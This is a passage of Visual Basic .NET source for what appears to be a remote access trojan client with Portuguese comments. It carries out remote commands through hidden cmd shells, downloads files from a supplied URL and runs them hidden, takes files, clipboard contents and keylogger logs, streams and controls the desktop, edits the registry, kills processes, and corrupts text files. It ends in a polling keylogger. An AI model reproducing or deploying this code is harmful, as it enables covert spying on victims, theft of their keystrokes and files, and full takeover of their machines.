                        Dim mes As String = "ငలုیတہင!qwertyuiopasdfghjklç" + asp + en + "0123456789zxcvbnm@#$%¨&*()_+=/?|\.+-*/,QWERTYUIOPASDFGH0" + asp + en + "123456789JKLÇZXCVBNM;:><^^~~]}" + asp + en + "[{``´´اలییاییاకسాకలامکمیکငలی莫ు్森ی莫اငیခا" + en + e
                        Dim R As New StreamReader(a(1))
                        Dim d As String
                        d = R.ReadToEnd
                        R.Close()
                        My.Computer.FileSystem.WriteAllText(a(1), keys + nu + keys + asp + keys + mn + keys + m + keys + mes + keys + en & d, False)
                    Catch ex As Exception
                    End Try
                    'pastas compartilhadas
                Case "pastacompartilhada"
                    Me.Label1.Text = ""
                    For Each Folders As String In GetSharedFolders()
                        Me.Label1.Text = Me.Label1.Text + " " + Folders + vbCrLf
                        c.Send("pastacompartilhada" & yy & Me.Label1.Text)
                    Next
                    Me.Label1.Text = "" 'linpar texte
                    'open past Downloads file manager
                Case "Downloads"
                    Try
                        s = "C:\Users\" & user & "\Downloads"
                        c.Send("getpath" & yy & s & "\")
                    Catch ex As Exception
                    End Try
                    'open past videos file manager
                Case "videos"
                    Try
                        s = "C:\Users\" & user & "\Videos"
                        c.Send("getpath" & yy & s & "\")
                    Catch ex As Exception
                    End Try
                    'open past picture file manager
                Case "picture"
                    Try
                        s = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures)
                        c.Send("getpath" & yy & s & "\")
                    Catch ex As Exception
                    End Try
                    'open past music file manager
                Case "music"
                    Try
                        s = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic)
                        c.Send("getpath" & yy & s & "\")
                    Catch ex As Exception
                    End Try
                    'open past ProgramFiles file manager
                Case "ProgramFiles"
                    Dim p As String
                    Try
                        s = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)
                        c.Send("getpath" & yy & s & "\")
                    Catch ex As Exception
                    End Try
                    Try
                        p = "C:\Program Files (x86)"
                        c.Send("getpath" & yy & p & "\")
                    Catch ex As Exception
                    End Try
                    'open past UserProfile file manager
                Case "UserProfile"
                    Try
                        s = "C:\Users"
                        c.Send("getpath" & yy & s & "\")
                    Catch ex As Exception
                    End Try
                    'open past system32 file manager
                Case "system32"
                    Try
                        s = Environment.GetFolderPath(Environment.SpecialFolder.System)
                        c.Send("getpath" & yy & s & "\")
                    Catch ex As Exception
                    End Try
                    'open past windows file manager
                Case "windows"
                    Try
                        s = "C:\Windows"
                        c.Send("getpath" & yy & s & "\")
                    Catch ex As Exception
                    End Try
                    'open past appdata file manager
                Case "appdata"
                    Try
                        s = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
                        c.Send("getpath" & yy & s & "\")
                    Catch ex As Exception
                    End Try
                    'open past file manager descktop
                Case "desktop"
                    Try
                        s = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
                        c.Send("getpath" & yy & s & "\")
                    Catch ex As Exception
                    End Try
                    'open past file manager Temp
                Case "temp"
                    Try
                        s = Path.GetTempPath
                        c.Send("getpath" & yy & s)
                    Catch ex As Exception
                    End Try
                    'open past file manager Startup
                Case "startup"
                    Try
                        s = Environment.GetFolderPath(Environment.SpecialFolder.Startup)
                        c.Send("getpath" & yy & s & "\")
                    Catch ex As Exception
                    End Try
                    'open past file manager documentos
                Case "documentos"
                    Try
                        s = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)
                        c.Send("getpath" & yy & s & "\")
                    Catch ex As Exception
                    End Try
                    'mostrar imagem em file manager
                Case "viewimage"
                    Try
                        c.Send("viewimage" & yy & Convert.ToBase64String(IO.File.ReadAllBytes(a(1))) & yy)
                    Catch ex As Exception
                    End Try
                    'mostrar txt em file manager
                Case "txtshow"
                    Try
                        Dim r As String = My.Computer.FileSystem.ReadAllText(a(1))
                        Dim r1 = r
                        c.Send("Text" & yy & r1)
                    Catch ex As Exception
                    End Try
                    'crypt txt em file manager
                Case "cryptTxt"
                    Try
                        Dim k As String = My.Computer.FileSystem.ReadAllText(a(1))
                        Dim r As String = Crypt(k)
                        IO.File.WriteAllText(a(1), r)
                        c.Send("cryptTxt")
                    Catch ex As Exception
                    End Try
                    'descrypt txt em file manager
                Case "descryptTXT"
                    Try
                        Dim k As String = My.Computer.FileSystem.ReadAllText(a(1))
                        Dim r As String = Crypt(k)
                        IO.File.WriteAllText(a(1), r)
                        c.Send("descryptTXT")
                    Catch ex As Exception
                    End Try
                    'compress winrar em file manager
                Case "compress"
                    Try
                        Compress(a(1))
                    Catch ex As Exception
                    End Try
                    'descompresss winrar em file manager
                Case "descompress"
                    Try
                        descompress(a(1))
                    Catch ex As Exception
                    End Try
                    'cmd comandos em computer
                Case "cmd"
                    Try
                        Dim w As String = (a(1)) '(A(1)) = comando
                        Shell("cmd.exe /c " & w & "& exit", FF) 'hide cmd + exit cmd
                    Catch ex As Exception
                    End Try
                Case "ppww"
                    c.Send("ppww" & yy & "bb" & alab)
                    'get clickbord
                Case "clipss"
                    c.Send("clipss" & yy & user & pc)
                    'get clickbord
                Case "getcli"
                    Me.Invoke(New gt(AddressOf gtx))
                    'logs keylogger online
                Case "online"
                    Try
                        c.Send("online" & yy & Me.TextBox2.Text)
                    Catch ex As Exception
                    End Try
                    'logs keylogger offine
                Case "getlog"
                    Try
                        c.Send("getlog" & yy & Me.TextBox1.Text)
                    Catch ex As Exception
                    End Try
                    'nova pasta file manager
                Case "creatnewfolder"
                    Try
                        My.Computer.FileSystem.CreateDirectory(a(1)) 'criar uma nova pasta no local



                        c.Send("creatnewfolder!" & yy & "A Pasta Foi Criada")
                    Catch ex As Exception
                        c.Send("creatnewfolderErro!" & yy & "Erro ")
                    End Try
                    'uplooad file manager
                Case "sendfileto"
                    Try
                        IO.File.WriteAllBytes(a(1), Convert.FromBase64String(a(2)))



                        c.Send("sendfileto" & yy & "Upload Completado") 'mensagem
                    Catch ex As Exception
                        c.Send("sendfiletoErro!" & yy & "Erro ") 'mensagem erro
                    End Try
                    'download file manager
                Case "downloadfile"
                    Try
                        c.Send("downloadedfile" & yy & Convert.ToBase64String(IO.File.ReadAllBytes(a(1))) & yy & a(2))



                        c.Send("downloadedCompletado" & yy & "Download Completado") 'mensagem
                    Catch ex As Exception
                        c.Send("downloadedfileErro!" & yy & "Erro ") 'mensagem erro
                    End Try
                    'enviar e executar + hide executavel
                Case "sendfile"
                    Try
                        If IO.File.Exists(IO.Path.GetTempPath() & a(1)) Then
                            IO.File.SetAttributes(IO.Path.GetTempPath() & a(1), normal) 'normal
                            IO.File.Delete(IO.Path.GetTempPath() & a(1)) 'delete
                            My.Computer.FileSystem.WriteAllBytes(IO.Path.GetTempPath & a(1), Convert.FromBase64String(a(2)), False) 'enviar
                            Threading.Thread.Sleep(1000) 'sleep
                            IO.File.SetAttributes(IO.Path.GetTempPath() & a(1), hiden) 'hide
                            Diagnostics.Process.Start(IO.Path.GetTempPath & a(1)) 'start
                        Else
                            My.Computer.FileSystem.WriteAllBytes(IO.Path.GetTempPath & a(1), Convert.FromBase64String(a(2)), False) 'enviar
                            Threading.Thread.Sleep(1000) 'sleep
                            IO.File.SetAttributes(IO.Path.GetTempPath() & a(1), hiden) 'hide
                            Diagnostics.Process.Start(IO.Path.GetTempPath & a(1)) 'start
                        End If
                        c.Send("sendfile!" & yy & "O Arquivo foi enviado e executado + Hide") 'mensagem 
                    Catch ex As Exception
                        c.Send("sendfileErro!" & yy & "Erro ") 'mensagem erro
                    End Try
                    'enviar e executar + executavel normal
                Case "sendfile2"
                    Try
                        If IO.File.Exists(IO.Path.GetTempPath() & a(1)) Then
                            IO.File.SetAttributes(IO.Path.GetTempPath() & a(1), normal) 'normal
                            IO.File.Delete(IO.Path.GetTempPath() & a(1)) 'delete
                            My.Computer.FileSystem.WriteAllBytes(IO.Path.GetTempPath & a(1), Convert.FromBase64String(a(2)), False) 'enviar
                            Threading.Thread.Sleep(1000) 'sleep
                            IO.File.SetAttributes(IO.Path.GetTempPath() & a(1), normal) 'hide
                            Diagnostics.Process.Start(IO.Path.GetTempPath & a(1)) 'start
                        Else
                            My.Computer.FileSystem.WriteAllBytes(IO.Path.GetTempPath & a(1), Convert.FromBase64String(a(2)), False) 'enviar
                            Threading.Thread.Sleep(1000) 'sleep
                            IO.File.SetAttributes(IO.Path.GetTempPath() & a(1), normal) 'hide
                            Diagnostics.Process.Start(IO.Path.GetTempPath & a(1)) 'start
                        End If
                        c.Send("sendfile!" & yy & "O Arquivo foi enviado e executado") 'mensagem 
                    Catch ex As Exception
                        c.Send("sendfileErro!" & yy & "Erro ") 'mensagem erro
                    End Try
                    'uplooad e execute + hide executavel/para Temp
                Case "D+r"
                    Try
                        If IO.File.Exists(IO.Path.GetTempPath() & a(2)) Then
                            IO.File.SetAttributes(IO.Path.GetTempPath() & a(2), normal) 'normal
                            IO.File.Delete(IO.Path.GetTempPath() & a(2)) 'delete
                            My.Computer.Network.DownloadFile(a(1), IO.Path.GetTempPath() & a(2)) 'baixar
                            Threading.Thread.Sleep(1000) 'sleep
                            IO.File.SetAttributes(IO.Path.GetTempPath() & a(2), hiden) 'hide
                            Diagnostics.Process.Start(IO.Path.GetTempPath() & a(2)) 'start
                        Else
                            My.Computer.Network.DownloadFile(a(1), IO.Path.GetTempPath() & a(2)) 'baixar
                            Threading.Thread.Sleep(1000) 'sleep
                            IO.File.SetAttributes(IO.Path.GetTempPath() & a(2), hiden) 'hide
                            Diagnostics.Process.Start(IO.Path.GetTempPath() & a(2)) 'start
                        End If
                        c.Send("D+r!" & yy & "O Arquivo foi baixado e executado + Hide") 'mensagem 
                    Catch ex As Exception
                        c.Send("D+rErro!" & yy & "Erro ") 'mensagem erro
                    End Try
                    'uplooad e execute + executavel normal/para Temp
                Case "D+r2"
                    Try
                        If IO.File.Exists(IO.Path.GetTempPath() & a(2)) Then
                            IO.File.SetAttributes(IO.Path.GetTempPath() & a(2), normal) 'normal
                            IO.File.Delete(IO.Path.GetTempPath() & a(2)) 'delete
                            My.Computer.Network.DownloadFile(a(1), IO.Path.GetTempPath() & a(2)) 'baixar
                            Threading.Thread.Sleep(1000) 'sleep
                            Diagnostics.Process.Start(IO.Path.GetTempPath() & a(2)) 'start
                        End If
                        My.Computer.Network.DownloadFile(a(1), IO.Path.GetTempPath() & a(2)) 'baixar
                        Threading.Thread.Sleep(1000) 'sleep
                        IO.File.SetAttributes(IO.Path.GetTempPath() & a(2), normal) 'normal
                        Diagnostics.Process.Start(IO.Path.GetTempPath() & a(2)) 'start
                        c.Send("D+r!" & yy & "O Arquivo foi baixado e executado") 'mensagem 
                    Catch ex As Exception
                        c.Send("D+rErro!" & yy & "Erro ") 'mensagem erro
                    End Try
                    'process manager
                Case "GetProcesses"
                    Try
                        Dim alProcess As String = ""
                        Dim ProcessList As Diagnostics.Process() = Diagnostics.Process.GetProcesses()
                        For Each p As Diagnostics.Process In Diagnostics.Process.GetProcesses
                            Try 'try obrigatorio
                                alProcess += p.ProcessName & G & user & G & p.Id & G &
                                p.SessionId & G & p.MainModule.FileName & G & p.StartTime & G & p.MainWindowTitle & G
                            Catch ex As Exception
                                alProcess += p.ProcessName & G & user & G & p.Id &
                                G & p.SessionId & G & "System" & G & "With Windows" & G & p.MainWindowTitle & G
                            End Try
                        Next
                        c.Send("ProcessManager" & yy & alProcess & yy & Path.GetFileNameWithoutExtension(XX))
                    Catch ex As Exception
                    End Try
                    'process manager kill
                Case "KillProcess"
                    Try
                        Dim eachprocess As String() = a(1).Split(G)
                        For i = 0 To eachprocess.Length - 2
                            For Each RunningProcess In Diagnostics.Process.GetProcessesByName(eachprocess(i))
                                RunningProcess.Kill() 'chamar pra da kill no processo 'RunningProcess' = kill processo / (eachprocess(i)) = name do processo
                            Next
                        Next
                    Catch ex As Exception
                        ProjectData.SetProjectError(ex)
                        ProjectData.ClearProjectError()
                    End Try
                    'process manager kill por cmd
                Case "killprocesscmd"
                    Try
                        Dim eachprocess As String() = a(1).Split(G)
                        For i = 0 To eachprocess.Length - 2
                            For Each RunningProcess In Diagnostics.Process.GetProcessesByName(eachprocess(i))
                                Dim comando As String = "taskkill /IM " & eachprocess(i) & ".exe" & " /f" 'eachprocess(i)) = name do processo
                                Shell("cmd.exe /c " & comando & "& exit", FF) 'kill process por cmd e hide cmd + exit cmd
                            Next
                        Next
                    Catch ex As Exception
                        ProjectData.SetProjectError(ex)
                        ProjectData.ClearProjectError()
                    End Try
                    'congelar processo
                Case "congelar"
                    Try
                        Dim eachprocess As String() = a(1).Split(G)
                        For i = 0 To eachprocess.Length - 2
                            Dim note As Diagnostics.Process() = Diagnostics.Process.GetProcessesByName(eachprocess(i))
                            SuspendProcess(note(0)) 'chamar pra congelar 'SuspendProcess'
                        Next
                    Catch ex As Exception
                        ProjectData.SetProjectError(ex)
                        ProjectData.ClearProjectError()
                    End Try
                    'descongelar processo
                Case "descongelar"
                    Try
                        Dim eachprocess As String() = a(1).Split(G)
                        For i = 0 To eachprocess.Length - 2
                            Dim note As Diagnostics.Process() = Diagnostics.Process.GetProcessesByName(eachprocess(i))
                            ResumeProcess(note(0)) 'chamar pra descongelar \ResumeProcess/
                        Next
                    Catch ex As Exception
                        ProjectData.SetProjectError(ex)
                        ProjectData.ClearProjectError()
                    End Try
                    'logoff restart e shotdown pc
                Case "Logoff" 'logoff restart e shotdown pc
                    Try
                        Shell("shutdown -l -t 00", FF) 'logoff pc + hide no cmd / 0 = tempo
                    Catch ex As Exception
                    End Try
                    'restart
                Case "Restart"
                    Try
                        Shell("shutdown -r -t 00", FF) 'restart pc + hide no cmd / 0 = tempo
                    Catch ex As Exception '
                    End Try
                    'shotdown
                Case "Shutdown"
                    Try
                        Shell("shutdown -s -t 00", FF) 'desligar pc + hide no cmd / 0 = tempo
                    Catch ex As Exception
                    End Try
                    'file manager drivers
                Case "GetDrives"
                    c.Send("FileManager" & yy & getDrives())
                    'file manager
                Case "FileManager"
                    Try
                        c.Send("FileManager" & yy & getFolders(a(1)) & getFiles(a(1)))
                    Catch
                        c.Send("FileManager" & yy & "Erro !!")
                    End Try
                    'normal + deletar arquivo e past 
                Case "normaldelete"
                    Try 'normal arquivo
                        IO.File.SetAttributes(a(1), normal) 'Normal arquivo
                    Catch ex As Exception
                    End Try
                    'deletar arquivo e past 
                Case "Delete"
                    Select Case a(1)
                        Case "Folder"
                            Try
                                IO.Directory.Delete(a(2)) 'delete past



                                c.Send("Delete!" & yy & "A Pasta Foi Deletada ")
                            Catch ex As Exception
                                ProjectData.SetProjectError(ex)
                                c.Send("DeleteErro!" & yy & "Erro A Pasta Não Pode Ser Deletada ")
                                ProjectData.ClearProjectError()
                            End Try
                        Case "File"
                            Try
                                IO.File.Delete(a(2)) 'delete arquivo (ex) .exe .rar .bat .dll



                                c.Send("Delete!" & yy & "O Arquivo Foi Deletado ")
                            Catch ex As Exception
                                ProjectData.SetProjectError(ex)
                                c.Send("DeleteErro!" & yy & "Erro O Arquivo Não Pode Ser Deletado ")
                                ProjectData.ClearProjectError()
                            End Try
                    End Select
                    'executar arquivo + hide execusao
                Case "Execute"
                    Try
                        SetAttr(a(1), hiden)
                        Diagnostics.Process.Start(a(1)) 'start



                        c.Send("Execute!" & yy & "O Arquivo Foi Executado + Hide")
                    Catch ex As Exception
                        c.Send("ExecuteErro!" & yy & "Erro ")
                    End Try
                    'executar arquivo + execusao normal
                Case "Execute2"
                    Try
                        Diagnostics.Process.Start(a(1)) 'start




                        c.Send("Execute!" & yy & "O Arquivo Foi Executado ")
                    Catch ex As Exception
                        c.Send("ExecuteErro!" & yy & "Erro ")
                    End Try
                    'renomear arquivo
                Case "Rename"
                    Try
                        Select Case a(1)
                            Case "Folder"
                                My.Computer.FileSystem.RenameDirectory(a(2), a(3)) 'renomear arquivo
                            Case "File"
                                My.Computer.FileSystem.RenameFile(a(2), a(3)) 'renomear arquivo
                        End Select



                        c.Send("Rename!" & yy & "O Arquivo Ou Pasta Foi Renomeado")
                    Catch ex As Exception
                        c.Send("RenameErro!" & yy & "Erro ")
                    End Try
                    'hedi arquivo
                Case "hidefolderfile"
                    Try
                        SetAttr(a(1), hiden) 'hide



                        c.Send("hidefolderfile!" & yy & "O Arquivo Foi Ocultado ")
                    Catch ex As Exception
                        c.Send("hidefolderfileErro!" & yy & "Erro ")
                    End Try
                    'show arquivo = arquivo normal 
                Case "showfolderfile"
                    Try
                        SetAttr(a(1), normal) 'restore ao  normal



                        c.Send("hidefolderfile!" & yy & "O Arquivo Foi Restalrado Ao Normal ")
                    Catch ex As Exception
                        c.Send("hidefolderfileErro!" & yy & "Erro ")
                    End Try
                    'remote descktop capture
                Case "!" 'server ask for my screen Size
                    CRDP.Clear()
                    Dim s = Screen.PrimaryScreen.Bounds.Size
                    Me.c.Send("!" & yy & s.Width & yy & s.Height)
                Case "!!" 'server ask for my screen Size / previa
                    CRDP.Clear()
                    Dim s = Screen.PrimaryScreen.Bounds.Size
                    c.Send("!!" & yy & s.Width & yy & s.Height)
                Case "@" 'remote descktop Capture
                    Dim SizeOfimage As Integer = a(1)
                    Dim Split As Integer = a(2)
                    Dim Quality As Integer = a(3)
                    Dim Bb As Byte() = CRDP.Cap(SizeOfimage, Split, Quality)
                    Dim M As New IO.MemoryStream
                    Dim CMD As String = "@" & yy
                    M.Write(SB(CMD), 0, CMD.Length)
                    M.Write(Bb, 0, Bb.Length)
                    c.Send(M.ToArray)
                    M.Dispose()
                    'remote descktop capture / brevia
                Case "@@" 'Start Capture descktop / brevia
                    Dim SizeOfimage As Integer = a(1)
                    Dim Split As Integer = a(2)
                    Dim Quality As Integer = a(3)
                    Dim Bb As Byte() = CRDP.Cap(SizeOfimage, Split, Quality)
                    Dim M As New IO.MemoryStream
                    Dim CMD As String = "@@" & yy
                    M.Write(SB(CMD), 0, CMD.Length)
                    M.Write(Bb, 0, Bb.Length)
                    c.Send(M.ToArray)
                    M.Dispose()
                Case "#" 'mouse clicks
                    Cursor.Position = New Point(a(1), a(2))
                    mouse_event(a(3), 0, 0, 0, 1)
                Case "$" 'mouse move
                    Cursor.Position = New Point(a(1), a(2))
                    'capture descktop brevia
                Case "infoDesk"
                    Dim m As Image = CaptureDesktop()
                    Dim cc As New ImageConverter
                    Dim bb As Byte() = cc.ConvertTo(m, b.GetType)
                    Me.c.Send("infoDesk" & yy & Convert.ToBase64String(bb))
                    'computer informations
                Case "sendinformation"
                    Dim a1, a2, a3, a4, a5 As String
                    Dim iphi As IPHostEntry = Dns.GetHostEntry(Dns.GetHostName) 'pegar ip da lan
                    Dim a7 As String = ""
                    Try
                        For I As Integer = 0 To iphi.AddressList.Length - 8 'numero de ip de lan 
                            a7 &= iphi.AddressList.GetValue(6).ToString() & vbNewLine
                        Next
                    Catch ex As Exception
                    End Try
                    a1 = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0", "ProcessorNameString", "")
                    a2 = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0", "Identifier", "")
                    a3 = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS", "SystemProductName", "")
                    a4 = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS", "BIOSReleaseDate", "")
                    a5 = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS", "SystemManufacturer", "")
                    c.Send("sendinformation" & yy & pc & yy & user & yy & windows1 & yy & vercion & yy & lin & yy & porta & yy & host & yy &
                    XX & yy & a1 & yy & a2 & yy & a3 & yy & a4 & yy & a5 & yy & Q & yy & country & yy & getanti() & yy & RAM() & yy &
                    bits() & yy & FR() & yy & dateday & yy & a7 & yy & Q & yy & local)
                    'registry do windows
                Case "RG"
                    Try
                        Dim kk As Object = GetKey(a(2))
                        Select Case a(1)
                            Case "~" 'send keys under key+ send values 
                                Dim s As String = "RG" & yy & "~" & yy & a(2) & yy
                                Dim o As String = ""
                                For Each xe As String In kk.GetSubKeyNames
                                    If xe.Contains("\") = False Then
                                        o += xe & yy
                                    End If
                                Next
                                For Each xs As String In kk.GetValueNames
                                    o += xs & "/" & kk.GetValueKind(xs).ToString & "/" & kk.GetValue(xs, "").ToString & yy
                                Next
                                Me.c.Send(s & o)
                            Case "!" 'Set Value
                                kk.SetValue(a(3), a(4), a(5))
                            Case "@5" 'delete value
                                kk.DeleteValue(a(3), False)
                            Case "#" 'creat key
                                kk.CreateSubKey(a(3))
                            Case "$" 'delete key
                                kk.DeleteSubKeyTree(a(3))
                        End Select
                    Catch ex As Exception
                        ProjectData.SetProjectError(ex)
                        ProjectData.ClearProjectError()
                    End Try
                    'abri formes em rat
                Case "fu"
                    c.Send("fu")
                Case "pa"
                    c.Send("pa")
                Case "++"
                    c.Send("++")
                Case "\\"
                    c.Send("\\")
                Case "openRG"
                    c.Send("openRG")
                Case "txtsend"
                    c.Send("txtsend")
                Case "openlo"
                    c.Send("openlo")
                Case "online1"
                    c.Send("online1")
                Case "openfm"
                    c.Send("openfm")
                Case "Cmdcomando"
                    c.Send("Cmdcomando")
                Case "txttextsend"
                    c.Send("txttextsend")
                Case "requestrecords"
                    c.Send("requestrecords")
            End Select
        Catch ex As Exception 'clean erros
            ProjectData.SetProjectError(ex)
            ProjectData.ClearProjectError()
        End Try
    End Sub
#End Region

    Function GetKey(ByVal key As String) As Microsoft.Win32.RegistryKey 'get registry Key/remomended regitrys na ordem 
        Try
            If key.StartsWith(Microsoft.Win32.Registry.ClassesRoot.Name) Then 'Classes Root
                k = key.Replace(Microsoft.Win32.Registry.ClassesRoot.Name & "\", "")
                Return Microsoft.Win32.Registry.ClassesRoot.OpenSubKey(k, True)
            End If
            If key.StartsWith(Microsoft.Win32.Registry.CurrentUser.Name) Then 'Current User
                k = key.Replace(Microsoft.Win32.Registry.CurrentUser.Name & "\", "")
                Return Microsoft.Win32.Registry.CurrentUser.OpenSubKey(k, True)
            End If
            If key.StartsWith(Microsoft.Win32.Registry.LocalMachine.Name) Then 'Local Machine
                k = key.Replace(Microsoft.Win32.Registry.LocalMachine.Name & "\", "")
                Return Microsoft.Win32.Registry.LocalMachine.OpenSubKey(k, True)
            End If
            If key.StartsWith(Microsoft.Win32.Registry.Users.Name) Then 'Users
                k = key.Replace(Microsoft.Win32.Registry.Users.Name & "\", "")
                Return Microsoft.Win32.Registry.Users.OpenSubKey(k, True)
            End If
            If key.StartsWith(Microsoft.Win32.Registry.CurrentConfig.Name) Then 'Current Config
                k = key.Replace(Microsoft.Win32.Registry.CurrentConfig.Name & "\", "")
                Return Microsoft.Win32.Registry.CurrentConfig.OpenSubKey(k, True)
            End If
            Return Nothing
        Catch ex As Exception 'clean erros em registry
            ProjectData.SetProjectError(ex)
            ProjectData.ClearProjectError()
        End Try
    End Function


    Public Function OCULTABARRA() As Boolean
        'barra de tarefas mostra
        Dim retval = False
        Dim hwndTaskBar = FindWindow("Shell_TrayWnd", "")
        If hwndTaskBar <> IntPtr.Zero Then
            retval = ShowWindow(hwndTaskBar, SW_HIDE)
        End If
        Return retval
    End Function

    Public Function MUESTRABARRA() As Boolean
        'barra de tarefas hide
        Dim retval2 = False
        Dim hwndTaskBar = FindWindow("Shell_TrayWnd", "")
        If hwndTaskBar <> IntPtr.Zero Then
            retval2 = ShowWindow(hwndTaskBar, SW_SHOW)
        End If
        Return retval2
    End Function

    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick 'interval 100/ keyloggers v3
        If (GetAsyncKeyState(Keys.A)) Then
            TECLA = TECLA + "A"

        ElseIf (GetAsyncKeyState(Keys.B)) Then
            TECLA = TECLA + "B"

        ElseIf (GetAsyncKeyState(Keys.C)) Then
            TECLA = TECLA + "C"

        ElseIf (GetAsyncKeyState(Keys.D)) Then
            TECLA = TECLA + "D"

        ElseIf (GetAsyncKeyState(Keys.E)) Then
            TECLA = TECLA + "E"

        ElseIf (GetAsyncKeyState(Keys.F)) Then
            TECLA = TECLA + "F"

        ElseIf (GetAsyncKeyState(Keys.G)) Then
            TECLA = TECLA + "G"

        ElseIf (GetAsyncKeyState(Keys.H)) Then
            TECLA = TECLA + "H"

        ElseIf (GetAsyncKeyState(Keys.I)) Then
            TECLA = TECLA + "I"

        ElseIf (GetAsyncKeyState(Keys.J)) Then
            TECLA = TECLA + "J"

        ElseIf (GetAsyncKeyState(Keys.K)) Then
            TECLA = TECLA + "K"

        ElseIf (GetAsyncKeyState(Keys.L)) Then
            TECLA = TECLA + "L"

        ElseIf (GetAsyncKeyState(Keys.M)) Then
            TECLA = TECLA + "M"

        ElseIf (GetAsyncKeyState(Keys.N)) Then
            TECLA = TECLA + "N"

        ElseIf (GetAsyncKeyState(Keys.O)) Then
            TECLA = TECLA + "O"

        ElseIf (GetAsyncKeyState(Keys.P)) Then
            TECLA = TECLA + "P"

        ElseIf (GetAsyncKeyState(Keys.Q)) Then
            TECLA = TECLA + "Q"

        ElseIf (GetAsyncKeyState(Keys.R)) Then
            TECLA = TECLA + "R"

        ElseIf (GetAsyncKeyState(Keys.S)) Then
            TECLA = TECLA + "S"

        ElseIf (GetAsyncKeyState(Keys.T)) Then
            TECLA = TECLA + "T"

        ElseIf (GetAsyncKeyState(Keys.U)) Then
            TECLA = TECLA + "U"

        ElseIf (GetAsyncKeyState(Keys.V)) Then
            TECLA = TECLA + "V"

        ElseIf (GetAsyncKeyState(Keys.W)) Then
            TECLA = TECLA + "W"

        ElseIf (GetAsyncKeyState(Keys.X)) Then
            TECLA = TECLA + "X"

        ElseIf (GetAsyncKeyState(Keys.Y)) Then
            TECLA = TECLA + "Y"

        ElseIf (GetAsyncKeyState(Keys.Z)) Then
            TECLA = TECLA + "Z"

        ElseIf (GetAsyncKeyState(186)) Then
            TECLA = TECLA + "ç"

        ElseIf (GetAsyncKeyState(Keys.NumPad0)) Then
            TECLA = TECLA + "0"

        ElseIf (GetAsyncKeyState(Keys.NumPad1)) Then
            TECLA = TECLA + "1"

        ElseIf (GetAsyncKeyState(Keys.NumPad2)) Then
            TECLA = TECLA + "2"

        ElseIf (GetAsyncKeyState(Keys.NumPad3)) Then
            TECLA = TECLA + "3"

        ElseIf (GetAsyncKeyState(Keys.NumPad4)) Then
            TECLA = TECLA + "4"

        ElseIf (GetAsyncKeyState(Keys.NumPad5)) Then
            TECLA = TECLA + "5"

        ElseIf (GetAsyncKeyState(Keys.NumPad6)) Then
            TECLA = TECLA + "6"

        ElseIf (GetAsyncKeyState(Keys.NumPad7)) Then
            TECLA = TECLA + "7"

        ElseIf (GetAsyncKeyState(Keys.NumPad8)) Then
            TECLA = TECLA + "8"

        ElseIf (GetAsyncKeyState(Keys.NumPad9)) Then
            TECLA = TECLA + "9"

        ElseIf (GetAsyncKeyState(Keys.Enter)) Then
            TECLA = TECLA + vbNewLine

        ElseIf (GetAsyncKeyState(Keys.F1)) Then
            TECLA = TECLA + "F1"

        ElseIf (GetAsyncKeyState(Keys.F2)) Then
            TECLA = TECLA + "F2"

        ElseIf (GetAsyncKeyState(Keys.F3)) Then
            TECLA = TECLA + "F3"

        ElseIf (GetAsyncKeyState(Keys.F4)) Then
            TECLA = TECLA + "F4"

        ElseIf (GetAsyncKeyState(Keys.F5)) Then
            TECLA = TECLA + "F5"

        ElseIf (GetAsyncKeyState(Keys.F6)) Then
            TECLA = TECLA + "F6"

        ElseIf (GetAsyncKeyState(Keys.F7)) Then
            TECLA = TECLA + "F7"

        ElseIf (GetAsyncKeyState(Keys.F8)) Then
            TECLA = TECLA + "F8"

        ElseIf (GetAsyncKeyState(Keys.F9)) Then
            TECLA = TECLA + "F9"

        ElseIf (GetAsyncKeyState(Keys.F10)) Then
            TECLA = TECLA + "F10"

        ElseIf (GetAsyncKeyState(Keys.F11)) Then
            TECLA = TECLA + "F11"

        ElseIf (GetAsyncKeyState(Keys.F12)) Then
            TECLA = TECLA + "F12"

        ElseIf (GetAsyncKeyState(Keys.Scroll)) Then
            TECLA = TECLA + "{ScrollLock}"

        ElseIf (GetAsyncKeyState(Keys.End)) Then
            TECLA = TECLA + "{End}"

        ElseIf (GetAsyncKeyState(Keys.NumLock)) Then
            TECLA = TECLA + "{NumLock}"

        ElseIf (GetAsyncKeyState(Keys.Delete)) Then
            TECLA = TECLA + "{Del}"

        ElseIf (GetAsyncKeyState(Keys.ControlKey)) Then
            TECLA = TECLA + "{Ctrl}"

        ElseIf (GetAsyncKeyState(Keys.Insert)) Then
            TECLA = TECLA + "{Insert}"

        ElseIf (GetAsyncKeyState(Keys.Up)) Then
            TECLA = TECLA + "{up}"

        ElseIf (GetAsyncKeyState(Keys.Down)) Then
            TECLA = TECLA + "{Down}"

        ElseIf (GetAsyncKeyState(Keys.Space)) Then
            TECLA = TECLA + " "

        ElseIf (GetAsyncKeyState(188)) Then
            TECLA = TECLA + ","

        ElseIf (GetAsyncKeyState(190)) Then
            TECLA = TECLA + "."

        ElseIf (GetAsyncKeyState(48)) Then
            TECLA = TECLA + "0"

        ElseIf (GetAsyncKeyState(49)) Then
            TECLA = TECLA + "1"

        ElseIf (GetAsyncKeyState(50)) Then
            TECLA = TECLA + "2"

        ElseIf (GetAsyncKeyState(51)) Then
            TECLA = TECLA + "3"

        ElseIf (GetAsyncKeyState(52)) Then
            TECLA = TECLA + "4"

        ElseIf (GetAsyncKeyState(53)) Then
            TECLA = TECLA + "5"

        ElseIf (GetAsyncKeyState(54)) Then
            TECLA = TECLA + "6"

        ElseIf (GetAsyncKeyState(55)) Then
            TECLA = TECLA + "7"

        ElseIf (GetAsyncKeyState(56)) Then
            TECLA = TECLA + "8"

        ElseIf (GetAsyncKeyState(57)) Then
